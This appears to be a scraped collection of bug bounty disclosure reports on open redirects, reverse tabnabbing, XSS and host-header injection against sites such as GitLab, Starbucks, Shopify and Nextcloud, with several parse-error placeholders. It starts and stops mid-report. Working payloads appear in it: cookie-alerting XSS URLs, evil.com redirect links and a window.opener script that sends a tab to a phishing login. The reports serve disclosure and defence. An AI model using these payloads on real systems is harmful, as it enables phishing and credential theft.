+Post data: phone_number=922+222+222&full_number=%2B351922222222aaaaaaaaaaaa&referrer=http://openbugbounty.org&slug=+moneyconf_17_exhibitor_17
+
+-https://forms.collisionconf.com/gates
+Post data: phone_number=914+444+444&full_number=%2B35191444444aaaaaaaa4&referrer=http://openbugbounty.org&slug=collision_startups_alpha
+
+
+-https://forms.websummit.net/gates
+Post data: phone_number=916+666+765&full_number=%2B351916666765aaaaaaa&referrer=http://openbugbounty.org&slug=ws16_alpha_14sept
+
+Thanks!
+
+
+===== RDIR-175085 | URI scheme bypass in mail app lead to HTML content spoof and opener control | sev= | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=1556
+## Bug
+When we load a HTML mail from mailbox via api, etc
+`http://nextcloud/index.php/apps/mail/accounts/<accountID>/folders/SU5CT1g=/messages/<mailID>/html`
+Our content will be passed to HTML Purifier to strip malicious XSS patterns.
+After that, an filter will apply to transform acceptable URI schemes `http, https, ftp, cid` to redirect/proxy service. 
+There's a bug in here, only `http, https, cid` scheme are filtered.
+So we can add `src` attribute or `href` from url with scheme `ftp` or `NULL` (like `'../../abc/xyz'`) . We can easily bypass image filter (also Content-Security-Policy)
+Notice that there's a filter that append `target=_blank` to all `<a>` tag. This can lead to opener bug [https://mathiasbynens.github.io/rel-noopener/#hax] (https://mathiasbynens.github.io/rel-noopener/#hax) that I learned from [124620] (https://hackerone.com/reports/124620).
+And finally it can leak accountID of user
+
+## PoC
+* Attacker create a shared link of a image
+
+`http://192.168.200.117/nextcloud/index.php/s/HUw7Cwa40Phlt8v/download`
+* Attacker start a ftp server and create a html page.
+
+`ftp://[REDACTED_CREDS]@localhost/test.html`
+* Attacker send a HTML email
+
+```
+<h1>test schema</h1>
+<p>
+	<a href="http://file.trich.im">Link via redirect</a><br>
+	<a href='ftp://[REDACTED_CREDS]@localhost/hihi.html'>Bypass link</a>
+</p>
+
+<p>
+	Filtered img<img src='http://192.168.200.117/nextcloud/index.php/s/HUw7Cwa40Phlt8v/download'><br>
+	Bypass img <img src='/nextcloud/index.php/s/HUw7Cwa40Phlt8v/download'>
+</p>
+```
+
+## Video Demo https://www.youtube.com/watch?v=BdOD49gokdI
+
+
+===== RDIR-175168 | [ecommerce.shopify.com] Invalidated redirection | sev=low | bounty=None | substate=resolved | weak=Open Redirect | len=910
+Hello,
+
+**Endpoint :** https://ecommerce.shopify.com/auth/shopify?shop=[victim_shop].myshopify.com&return_to=/////example.com
+
+Suppose, victim has not linked his shop with ecommerce.shopify.com portal then an attacker can redirect him on an external website after linking or rejecting. 
+
+**Steps to reproduce :**
+
+1. Get logged in as admin in your shop and ecommerce.shopify.com
+2. Open this link : https://ecommerce.shopify.com/auth/shopify?shop=[your-shop].myshopify.com&return_to=/////example.com
+3. If you are logged in then **Link These Accounts** button and **No thanks** link will be shown.
+4. Click on **Link Account** button or **No thanks** link.
+5. You will be redirected on https://example.com instead of ecommerce.shopify.com
+6. Done
+
+Again, your shop should not be linked to ecommerce.shopify.com.
+
+**Suggested Fix :** Use more stronger regular expression at this endpoint
+
+Best regards,
+Shailesh
+
+
+===== RDIR-177485 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-177624 | Unvalidated redirect on team.badoo.com | sev=medium | bounty=140.0 | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=749
+#Domain affected: 
+https://team.badoo.com/  (corp.badoo.com)
+
+#PoC (Tested on Firefox): 
+https://team.badoo.com/%0d%0adata:text/html;text,%3Csvg%2fonload%3Dprompt%281%29%3E
+{F129735}
+
+#Describe:
+team.badoo.com may vulnerable to CRLF injection, when we inject %0d%0a into url, the Location header, entire content after %0d%0a and '/' will appear in Response header:
+{F129733}
+
+Since your server is configured pretty good that i can't do attack like HTTP response splitting or redirect to external url, i decided to test XSS on it.
+
+Using Data URI scheme which is a uniform resource identifier (URI) scheme that provides a way to include data in-line in web pages as if they were external resources can bypass it and triggered XSS:
+{F129734}
+
+
+ 
+
+
+
+
+
+
+
+
+===== RDIR-178278 | [parc.informatica.com] Reflected Cross Site Scripting and Open Redirect | sev=medium | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=770
+Hi !
+I just want to report you a vulnerability in your subdomain ,,parc''
+
+**Description**
+
+In this link *https://parc.informatica.com/partners/apex/Cloud_chat?endpoint=* the vulnerable parameter is ,,endpoint''. Once the parameter takes the value of a XSS vector or a website link the code is executed after we complete the form.
+
+**Steps to reproduce**
+
+Go to *https://parc.informatica.com/partners/apex/Cloud_chat?endpoint=javascript:alert(document.domain)*
+
+After you complete the form, alert executed document.domain .
+
+and Open redirect: *https://parc.informatica.com/partners/apex/Cloud_chat?endpoint=http://evil.com* after you complete the form, you are redirected to evil.com
+
+I think it's valid because in your scope is *.informatica.com
+Thanks for attention !
+
+
+===== RDIR-178345 | Limited Open redirection using SSO-SAML | sev=low | bounty=None | substate=resolved | weak=Open Redirect | len=851
+Hello,
+
+**Endpoint:** https://hackerone.com/users//saml/sign_in?email=[REDACTED_EMAIL]&remember_me=true
+
+Recently, you have patched an open redirection issue which was reported as #171398. 
+I found a bypass of that patch. 
+
+**Steps to reproduce:** 
+1. Add following in comment/report : 
+```https://hackerone.com/users//saml/sign_in?email=[REDACTED_EMAIL]&remember_me=true``` 
+2. Click on link. 
+3. You will redirected on SSO URL without going through **External Link Warning** page. 
+4. Done.
+
+PoC  : 
+https://hackerone.com/users/saml/sign_in?email=[REDACTED_EMAIL]&remember_me=true (Through external warning page)
+https://hackerone.com/users//saml/sign_in?email=[REDACTED_EMAIL]&remember_me=true (Without external warning page)
+
+**Suggested Fix:** Use more stronger regular expression and filtration at this endpoint.
+
+Best regards,
+Shailesh
+
+
+
+===== RDIR-179328 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-179568 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-179763 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-181088 | Window.opener bug at www.coinbase.com | sev= | bounty=100.0 | substate=resolved | weak= | len=748
+**Window.Opener Bug**
+
+**Description:**
+
+When you open a link in a new tab ( target="_blank" ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property.
+
+**Browsers Verified In:**
+
+  * Mozilla Firefox
+
+**Steps To Reproduce:**
+
+1. Visit https://www.coinbase.com/
+2. In Image F133659, If you notice the links go through `https://www.coinbase.com/external_redirect` except "Bloomberg"
+
+3. Since Bloomberg works on `http`, If you're in the same network you can manipulate the bloomberg page and inject a script which manipulates `window.opener`
+
+`window.opener.location.replace("https://www.notcoinbase.com");`
+
+I understand this is very trivial to exploit and does not have very big impact
+
+
+===== RDIR-181225 | Missing rel=noopener noreferrer in target=_blank links (Phishing attack) | sev= | bounty=None | substate=resolved | weak= | len=2091
+Links that use target=_blank need to have rel="noopener noreferrer" in order to mitigate phishing attack (opened page can change the location of page that opened him via window.opener.location = 'http://phishingsite.com/' )
+
+more information about this vulnerability:
+https://blog.whatever.io/2015/03/07/on-the-security-implications-of-window-opener-location-replace/
+https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
+
+steps to reproduce:
+
+1\. click on any of the links below from airship.
+2\. run the following javascript code in new opened page:
+```
+window.opener.location = 'http://phishingsite.com/'
+```
+The above will work even if the target domain is changed (not github.com anymore) via clicking on link from target domain.
+
+usage of _blank in airship:
+
+1\. https://github.com/paragonie/airship/blob/master/src/Installer/skins/admin_account.twig#L17
+```
+            get a password manager such as <a target="_blank" href="https://github.com/keepassx/keepassx/">KeePassX</a>.
+```
+
+2\. https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Bridge/public/passwords.js#L26
+```
+        html = 'Good password, as long as it\'s unique!<br />If you\'re not already, consider using a password manager such as <a target="_blank" href="https://github.com/keepassx/keepassx/">KeePassX</a>.';
+```
+
+3.\ https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Installer/skins/js/admin_account.js.twig#L26
+```
+        html = 'Good password, as long as it\'s unique!<br />If you\'re not already, consider using a password manager such as <a target="_blank" href="https://github.com/keepassx/keepassx/">KeePassX</a>.';
+```
+
+4\. https://github.com/paragonie/airship/blob/master/src/public/js/wysihtml5/parser_rules/simple.js#L23-L26
+```
+      set_attributes: {
+        target: "_blank",
+        rel:    "nofollow"
+      },
+```
+
+fix:
+1. always add rel="noopener noreferrer" for links that have target=_blank, unless the opened window need to change the location using window.opener.location
+
+
+===== RDIR-181939 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-183796 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-186862 | Order-phishing via Payment ID URL | sev=low | bounty=None | substate=informative | weak=Cross-Site Request Forgery (CSRF) | len=901
+Hello. I discovered the endpoint, which allows the attacker conduct the fishing attack to other users and they can pay for attacker's order.
+Why this can happen? 
+On the site, order id parameter sends to the https://portswigger.net/CCPayment.aspx as POST, but attacker can append it as GET and it will works:
+
+Example:
+https://portswigger.net/CCPayment.aspx?id=DD6BE85CDD50DC829C0354F83E5C67
+
+Steps to reproduce:
+1) Go to the https://portswigger.net/buy/ and fill the form.
+2) Click "Confirm details".
+3) Click "Pay by credit card".
+4) Catch the POST request from ССpayment.aspx with order id:
+
+POST /CCPayment.aspx HTTP/1.1
+[...Headers...]
+
+id=05BC4BF36F9BB32E80F4B581BF4859
+
+5) Now append the id as GET parameter. You will have link like https://portswigger.net/CCPayment.aspx?id=05BC4BF36F9BB32E80F4B581BF4859
+6) Now you can conduct phishing attack with this link, and users can pay for your order.
+
+
+===== RDIR-187006 | Open Redirect in a DoD website | sev=low | bounty=None | substate=resolved | weak=Open Redirect | len=382
+An open redirect vulnerability was found on a Department of Defense website which may trick a web user into being redirected to fake websites which may steal data or credentials (usernames and passwords), or trick users into installing malware. adrianomarcmont was able to demonstrate this vulnerability by crafting a specially formatted URL. Thanks adrianomarcmont!
+[team summary] 
+
+
+===== RDIR-187969 | Open redirect vulnerability in a DoD website | sev=low | bounty=None | substate=resolved | weak=Open Redirect | len=381
+An open redirect vulnerability was found on a Department of Defense website which may trick a web user into being redirected to fake websites which may steal data or credentials (usernames and passwords), or trick users into installing malware. @niwasaki was able to demonstrate this vulnerability by crafting a specially formatted URL. Thank you for notifying us!
+
+[team summary] 
+
+
+===== RDIR-188266 | Redirect in adding advance cash on delivery app | sev=low | bounty=None | substate=resolved | weak=Open Redirect | len=1115
+Hello,
+
+When you install `Advance Cash on delivery` App in your shop, it takes you to the url 
+
+{F140362}
+
+`https://<YourShop>.myshopify.com/admin/authorize_gateway/1041328?api_key=[REDACTED_SECRET]enabled`
+
+
+{F140363}
+
+Here, `return_url` can be used for redirection.
+
+So if any shop which has this app installed but not yet activated, attacker can just send the above url to the victim by just changing the shop name in the url to the victim's shop name and `return_url` with some malicious url . api_key will remain the same.
+
+`https://<YourShop>.myshopify.com/admin/authorize_gateway/1041328?api_key=[REDACTED_SECRET]
+
+#Steps
+
+1. Lets assume a victim Shop with `Advance cash on delivery` app installed but not activated yet
+
+2. Send the url `https://<YourShop>.myshopify.com/admin/authorize_gateway/1041328?api_key=[REDACTED_SECRET] to the victim.
+
+3. On click of Activate button, victim will be redirected to `https://google.com`
+
+Thanks & Regards
+Ashish
+
+
+
+
+===== RDIR-190188 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-191196 | Authorization issue in Google G Suite allows DoS through HTTP redirect | sev=high | bounty=None | substate=resolved | weak=Uncontrolled Resource Consumption | len=845
+The combination of an authorization flaw in Google’s G Suite and a misconfiguration on Uber’s behalf, allowed @uranium238 to set up an HTTP redirect for the domain ubereats.com. For some UberEats customers, this resulted in not being able to use the service for a short period of time. 
+
+@uranium238 brought the vulnerability to our attention, was able to demonstrate the security impact, and worked with both Uber and Google to validate the fixes. We look forward to more reports from @uranium238 in the future.
+[team summary] Uber handled this report in a professional manner. Overall, I love reporting bugs to Uber. Thank you for everyone at Uber who worked on this and sorry for the trouble this bug caused for a while. 
+https://medium.com/@rojanrijal/this-domain-is-my-domain-g-suite-a-record-vulnerability-b447a90a8de7
+Cheers,
+@uranium238 
+
+
+===== RDIR-191387 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-192373 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-192375 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-193027 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-194207 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-196846 | Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / teavana.com) | sev=medium | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=1404
+Hello, during some open redirects testing, I have noticed a very strange redirect that occured when I had modified a parameter using something like `>cofee`. I have digged up further and then I have noticed that one can make a redirect by modifying GET parameters with this structure : `<>//google.com`
+
+There seems to be a stripping of tags and after that some chained redirect, that will eventually trigger an XSS vulnerability if the payload is like : `<>javascript:alert(document.cookie);`.
+
+__So, based on this I have noticed that all your websites except the starbucks.* are vulnerable to an XSS payload that is written directly in the root URL or almost ANY other get parameter__, thus making almost all the websites exploitable with multiple injection points (starbucks.* seems not affected)
+
+POC EXAMPLES
+-------
+```
+https://shop.starbucks.de/<>javascript:alert(document.cookie);
+https://teavana.com/<>javascript:alert(document.cookie);
+https://store.starbucks.com/<>javascript:alert(document.cookie);
+https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated&prefv1=<>javascript:alert('xss parameter');
+https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=<>javascript:alert('xss parameter');
+```
+
+Bonus - open redirect example :
+```
+https://shop.starbucks.de/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated&prefv1=<>//google.com
+https://teavana.com/<>//google.com
+```
+
+
+===== RDIR-203726 | Open Redirect in <customer>.greenhouse.io | sev=high | bounty=None | substate=resolved | weak=Open Redirect | len=6658
+## Open Redirect in scout24.greenhouse.io
+
+The **Scout24 Security Team** did a penetration test against `scout24.greenhouse.io` in order to verify how Scout24 relevant data is protected against common attack vectors. Basically we have tested the (web) application against [OWASP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project) using industry common metholodogies. 
+
+## Reproduction steps
+
+* Visit https://boards.greenhouse.io/scout24 and click on some job offer (I chosed [this one](https://boards.greenhouse.io/scout24/jobs/503488))
+* After completing your personal information, you can *upload* some documents
+	* Click `Attach` both under *Resume/CV* and *Cover Letter*
+	* Upload some PDF files from your local host (in my case the file uwas called `neu.pdf`)
+* In the end you send your application by clicking on `Submit Application`
+
+Using a HTTP proxy (in my case that was [Burp](https://portswigger.net/burp/)) I was able to intercept the `POST` request made by the browser before being sent to the `greenhouse.io` API. This is some sample request:
+
+### Proof-of-Concept (PoC)
+
+```.http
+POST /scout24/jobs/503488 HTTP/1.1
+Host: boards.greenhouse.io
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-NewRelic-ID: VQ4PWFNbGwIFU1dbAgcB
+X-CSRF-Token: zF19Ky8GR0J/ZP7aLfFiN+p8Udc+X8ikPyk0cX7LlzgS0i4wWFIchmqcmsR3aXA0T1XSNrXSWdrVb47bGjGrEg==
+X-Requested-With: XMLHttpRequest
+Referer: https://boards.greenhouse.io/scout24/jobs/503488
+Content-Length: 4086
+Content-Type: multipart/form-data; boundary=---------------------------844282227400113298508475861
+Cookie: __utma=44269810.1998188318.1484665255.1484837763.1484901247.18; __utmz=44269810.1484837763.17.11.utmcsr=scout24.eu.auth0.com|utmccn=(referral)|utmcmd=referral|utmcct=/login/callback; __zlcmid=edg9prI9rr6P3K; __utmc=44269810; __utmb=44269810.15.9.1484902626060; __atuvc=4%7C3; __atuvs=5881cd5b6c1ca704003; _jbs=7897bb31a3e984da1f15ec3b3f0e8129; __utmt=1
+Connection: close
+
+[...]
+-----------------------------844282227400113298508475861
+Content-Disposition: form-data; name="job_application[resume_url]"
+
+https://grnhse-prod-jben-us-east-1.s3.amazonaws.com/applications%2Fresumes%2F1484902660983-1663bnwl7dt-b044057e6364840cde6c41d55de3a1e1%2Fneu.pdf
+-----------------------------844282227400113298508475861
+Content-Disposition: form-data; name="job_application[resume_url_filename]"
+
+neu.pdf
+-----------------------------844282227400113298508475861
+Content-Disposition: form-data; name="job_application[cover_letter_url]"
+
+https://grnhse-prod-jben-us-east-1.s3.amazonaws.com/applications%2Fresumes%2F1484902672335-lpk5xur1na-67346266367805828242f31b3887e539%2Fneu.pdf
+-----------------------------844282227400113298508475861
+Content-Disposition: form-data; name="job_application[cover_letter_url_filename]"
+
+neu.pdf
+-----------------------------844282227400113298508475861--
+```
+
+As you can notice the files have been already uploaded to `AWS` and therfore a S3 bucket links are 
+used within the requests. 
+
+## Exploitability
+
+Using a browser and a HTTP proxy the request can be easily intercepted. In the **original** request the `Content-Disposition` parameter `job_application[cover_letter_url]` in the `POST` request contains a S3 bucket link. However, after tampering the request, the parameters values can be changed. In our specific case the value (basically an URL) could be changed to:
+
+* a phishing site
+* a site containing some malware
+
+After intercepting the request, the parameter was modified like this:
+
+```.http
+POST /scout24/jobs/503488 HTTP/1.1
+Host: boards.greenhouse.io
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-NewRelic-ID: VQ4PWFNbGwIFU1dbAgcB
+X-CSRF-Token: zF19Ky8GR0J/ZP7aLfFiN+p8Udc+X8ikPyk0cX7LlzgS0i4wWFIchmqcmsR3aXA0T1XSNrXSWdrVb47bGjGrEg==
+X-Requested-With: XMLHttpRequest
+Referer: https://boards.greenhouse.io/scout24/jobs/503488
+Content-Length: 4086
+Content-Type: multipart/form-data; boundary=---------------------------844282227400113298508475861
+Cookie: __utma=44269810.1998188318.1484665255.1484837763.1484901247.18; __utmz=44269810.1484837763.17.11.utmcsr=scout24.eu.auth0.com|utmccn=(referral)|utmcmd=referral|utmcct=/login/callback; __zlcmid=edg9prI9rr6P3K; __utmc=44269810; __utmb=44269810.15.9.1484902626060; __atuvc=4%7C3; __atuvs=5881cd5b6c1ca704003; _jbs=7897bb31a3e984da1f15ec3b3f0e8129; __utmt=1
+Connection: close
+[...]
+
+-----------------------------844282227400113298508475861
+Content-Disposition: form-data; name="job_application[resume_url]"
+
+https://google.com
+-----------------------------844282227400113298508475861
+Content-Disposition: form-data; name="job_application[resume_url_filename]"
+
+neu.pdf
+-----------------------------844282227400113298508475861
+Content-Disposition: form-data; name="job_application[cover_letter_url]"
+
+http://google.com
+-----------------------------844282227400113298508475861
+Content-Disposition: form-data; name="job_application[cover_letter_url_filename]"
+```
+
+Whenever the hiring manager will try to view the uploaded content, the application will not be able to render the content. Instead the person will then try to **download** the file by clicking on `Download` (left upper corner). Although the browser shows that the URL points to some specific `AWS` domain, the content is actually loaded from somewhere else (in this case from [https://google.com](https://google.com)). 
+
+Again, an attacker could then submit some URL containing malicious content or some phishing site. Only for the purpose of this report, something unspectacular like [https://google.com](https://google.com) has been chosen. 
+
+## Impact
+
+The attack can be conducted in multiple scenarios:
+
+* anonymous person applies for some jobs and manipulates the parameters (like described above)
+* internal employee adds referal for some person and also manipulates the parameters
+
+In both cases the hiring manager would then unknowingly access the manipulated links which could then lead to:
+
+* installation of trojan horses / ransomeware (in general malicious content)
+* a phishing site where e.g. AD credentials are claimed to be required
+* CSRF (Cross-Site Request Forgery) [attacks](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
+
+## Remediation
+
+The affected parameter should be first validated against some regular expression (e.g. allow only links that point to `grnhse-prod-jben-*.s3.amazonaws.com`). 
+
+
+
+
+
+
+
+
+===== RDIR-206811 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-207170 | Stealing xoxs-tokens using weak postMessage / call-popup redirect to current team domain | sev= | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=324
+@fransrosen discovered a vulnerability which would allow an attacker running a malicious site to steal XOXS tokens. We resolved the postMessage and call-popup redirect issues, and performed a thorough investigation to confirm that this had never been exploited. Thanks @fransrosen for an interesting finding!
+[team summary] 
+
+
+===== RDIR-209821 | URL Given leading to end users ending up in malicious sites | sev=medium | bounty=None | substate=informative | weak=Violation of Secure Design Principles | len=855
+Hi,
+
+I found a design issue in the profile statement for the registered user. This is dependant on the end user however.
+
+In the profile statement, one can write something as well giving links is allowed. This, I think is by design. However, let us suppose the authenticated user creates a website of his own which is basically a phishing page. Or he gives links to malicious websites.
+
+Next he sends the link of his page to the victim. Try out this page.
+https://gratipay.com/~www.google.com/.
+
+Here the first link is to www.google.com. However, the next link is unknown and can be malicious.
+
+Yes, this depends on the end user completely but I still think this is an issue.
+
+Mitigation: Allow only alphabets or display the entire thing as text. The end user can copy paste the link in the browser if it is that relevant.
+
+Thanks & Regards,
+Dipmalya Pyne
+
+
+===== RDIR-210384 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-210875 | use of unsafe host header leads to open redirect | sev=low | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=2915
+Hi guys
+
+I noticed you are using unsafe host header in generating short links.
+
+#Details 
+First i navigated to my account 
+`https://socialclub.rockstargames.com/member/xerojuzto`
+
+Then i created a new message , and i clicked on share button which shortens the url for example 
+
+From `https://socialclub.rockstargames.com/member/xerojuzto/feed/3073813190982488067` 
+to `http://rsg.ms/517ae7c`
+
+I fetched the http requests to find the end-point which is used to shorten urls.
+`https://socialclub.rockstargames.com/some_dirs/share/Person/getcontent?_=1488723542848`
+
+the end-point is taking all the url parts before `/Share/Person` and creates a short link corresponding to this cut url.
+
+I Guess the code looks like 
+```
+<?php
+$actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+$trimed_link=explode($actual_link,"/Share");
+
+$short=DB_Create_short_link($trimed_link);
+echo $short;
+?>
+```
+Did you notice the usage of `HTTP_HOST` which  is variable and could be changed by sending different host header values , this will result in creating malicious urls.
+
+The following request 
+```
+GET /feed/102126489/activity/3073813190982488067/share/Person/getcontent?_=1488723542848 HTTP/1.1
+Host: socialclub.rockstargames.com
+```
+Is meant to shorten `/feed/102126489/activity/3073813190982488067` to `http://rsg.ms/517ae7c`   but due to not sharing my wall , it will create another redirect to my profile `https://socialclub.rockstargames.com/member/xerojuzto`
+
+#Exploiting
+I tried to manipulate the host header to force it to redirect the client  to my domain
+
+```
+GET /feed/102126489/activity/2960911889698885091/share/Person/getcontent?_=1488725310707 HTTP/1.1
+Host: socialclub.rockstargames.com.this.is.my.domain.evil.net
+```
+
+and it resulted in creating `http://rsg.ms/5350b75` if you visited it , you would be redirected to 
+
+`https://socialclub.rockstargames.com.this.is.my.domain.evil.net/member/xerojuzto/feed/2960911889698885091` 
+Which is not your domain.
+
+#Consequences
+1- Phishing attacks
+2- Open redirects
+3- Cache poisoning and password reset leakage (Limited)
+
+#Steps to reproduce
+1- Log into your account at socialclub
+2- Navigate to your profile
+3- Post a new message
+4- Set up a proxy server (i used burp)
+5- Configure your browser(firefox in my case) to work with the proxy server
+6- Click on share button 
+7- Intercept the request
+8- Manipulate the host header and copy the generated shorten url (ex: rsg.ms/5350b75)
+9- Visit it and you will see a redirect to the injected domain.
+
+you can visit `http://rsg.ms/5350b75` , if you need a video just shout me .
+
+
+#Fix
+- If you are shortening urls from only `socialclub` , then you should correctly validate the host header 
+-If you are using many domains 
+   you should create a white list for them before constructing urls.
+
+
+#Ref 
+http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
+
+
+
+Best regards
+Yasser
+
+
+
+
+
+
+
+
+
+
+
+
+
+===== RDIR-211065 | Gitlab.com is vulnerable to reverse tabnabbing. | sev=low | bounty=None | substate=resolved | weak=Open Redirect | len=2138
+Dear GitLab bug bounty team,
+
+# Summary
+---
+
+Gitlab.com is vulnerable to reverse tabnabbing, since you use `target="_blank"` on links in the *Environments* section.
+
+{F166659}
+
+# Why does this vulnerability exist?
+---
+
+The following `<a href="https://example.com/" target="_blank">link</a>` is vulnerable to reverse tabnabbing, because it uses `target="_blank"`:
+
+~~~
+<a target="_blank" class="btn external-url" href="https://evil.com"><i class="fa fa-external-link"></i>
+</a>
+~~~
+
+This means the page that opens in a new tab can access the initial tab and change its location using the `window.opener` property.
+
+# What are the exploits?
+---
+
+I used some simple tricks to further increase the chances of this attack working. I added a link to a website which contains the following code:
+
+~~~
+<!DOCTYPE html>
+<html>
+<head>
+    <title>404 Not Found</title>
+</head>
+<body>
+    <h1>Not Found</h1>
+    <p>The requested URL was not found on this server.</p>
+    <hr>
+    <address>Apache/2.2.15 (Red Hat) Server at gitlab.com Port 443</address>
+    <script>
+        window.opener.location.assign('https://evil.com/ph-login.html');
+    </script>
+</body>
+</html>
+~~~
+
+{F166662}
+
+The new tab displays a 404 page which increases the likelihood that the victim will return to the previous tab. While the victim visited the attacker's page, the initial tab was redirected to `https://evil.com/ph-login.html`. This page looks exactly like the GitLab login form and asks the victim to re-enter their login credentials.
+
+{F166660}
+
+# How can this be fixed?
+---
+
+In order to mitigate this issue, developers are encouraged to use `rel="nofollow noopener noreferrer"` as follows:
+
+~~~
+<a target="_blank" class="btn external-url" href="https://evil.com" rel="nofollow noopener noreferrer"><i class="fa fa-external-link"></i>
+</a>
+~~~
+
+Now when you click on this link, the attacker cannot access the initial tab.
+
+For more on reverse tabnabbing, please refer to the following page: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
+
+If you require further information feel free to contact me.
+
+Yours sincerely,
+Ed
+
+
+===== RDIR-211213 | https://xmpp.nextcloud.com///;@www.google.com allows open redirect | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=246
+
+Good day :)
+
+Hope it goes well, an open redirect exists on the main xmpp.nextcloud.com domain allowing "bad hackers" to do bad things :)
+
+Poc 
+
+https://xmpp.nextcloud.com///;@www.google.com
+
+May you be well on your side of the screen :)
+
+-Eric
+
+
+
+
+===== RDIR-212629 | Gitlab.com is vulnerable to reverse tabnabbing. (#2) | sev=medium | bounty=None | substate=resolved | weak=UI Redressing (Clickjacking) | len=1498
+Dear GitLab bug bounty team,
+
+# Summary
+---
+
+Gitlab.com is vulnerable to reverse tabnabbing in issues, comments, etc. This is the same type of issue as https://hackerone.com/reports/211065, but far worse since in the previous report only a user with developer access to a project could view the "Environments" tab. In this case, the issue affects anywhere where HTML can be added.
+
+# Why does this vulnerability exist?
+---
+
+By creating a link with `https://[REDACTED_EMAIL]` the parser ignores it and does not add the usual `rel="nofollow noreferrer"` which is located on all other links. I discovered this, because I noticed that internal links are treated differently than external links. So in the example above the victim ends up on `example.com`, which is where the same scenario as https://hackerone.com/reports/211065 can be performed.
+
+In order to demonstrate this issue the following payload can be used:
+
+~~~
+<a href="https://[REDACTED_EMAIL]" target="_blank">Reverse Tabnabbing</a>
+~~~
+
+# Where does the issue lie?
+---
+
+The issue appears to lie in the following lines of code:
+
+~~~
+it 'skips internal links' do
+    internal = Gitlab.config.gitlab.url
+    exp = act = %Q(<a href="#{internal}/sign_in">Login</a>)
+    expect(filter(act).to_html).to eq exp
+  end
+~~~
+
+Link to source code: https://github.com/gitlabhq/gitlabhq/blob/master/spec/lib/banzai/filter/external_link_filter_spec.rb#L16-L20
+
+If you require further information feel free to contact me.
+
+Yours sincerely,
+Ed
+
+
+===== RDIR-213056 | Invalid request may lead content spoofing for phishing | sev= | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=169
+HI,
+
+I found that site have invalid request may lead to content spoof.
+
+Proof Of Concept:
+
+https://logs.nextcloud.com/redirect_uri?And_move_t0_malicioussite.com
+
+Thanks,
+
+
+===== RDIR-213114 | Gitlab.com is vulnerable to reverse tabnabbing via AsciiDoc links. (#3) | sev=medium | bounty=None | substate=resolved | weak=UI Redressing (Clickjacking) | len=419
+Dear GitLab bug bounty team,
+
+# Summary
+---
+Gitlab.com is vulnerable to reverse tabnabbing in AsciiDoc files. 
+
+# Why does this vulnerability exist?
+---
+
+In AsciiDoc the following `http://example.com[Reverse Tabnabbing^]` is equivalent to `<a href="http://example.com" target="_blank">Reverse Tabnabbing</a>`.
+
+# How can this exploited?
+---
+
+Same scenario as https://hackerone.com/reports/211065. ;)
+
+Best regards,
+Ed
+
+
+
+
+===== RDIR-214034 | Open redirect | sev=medium | bounty=None | substate=resolved | weak=Open Redirect | len=296
+POC:
+
+$GITLAB_INSTANCE = gitlab.com
+
+Visit: 
+
+https://$GITLAB_INSTANCE/dashboard/todos?page=99999999&host=www.google.com
+
+Bug is in Dashboard::TodosController line 10
+
+Likey
+Same bug in Projects::IssuesController line 32
+and other places in the codebase where you `redirect_to params.merge(..)` 
+
+
+
+===== RDIR-215970 | [Repository Import] Open Redirect via "continue[to]" parameter  | sev=medium | bounty=None | substate=resolved | weak=Open Redirect | len=744
+Hi,
+
+While experimenting with Repository Import functionality on a fresh GitLab 9.0 CE install, I noticed that the `continue[to]` parameter can be used to perform an Open Redirect through the inclusion of a double-slash prefix. 
+
+## Proof of Concept
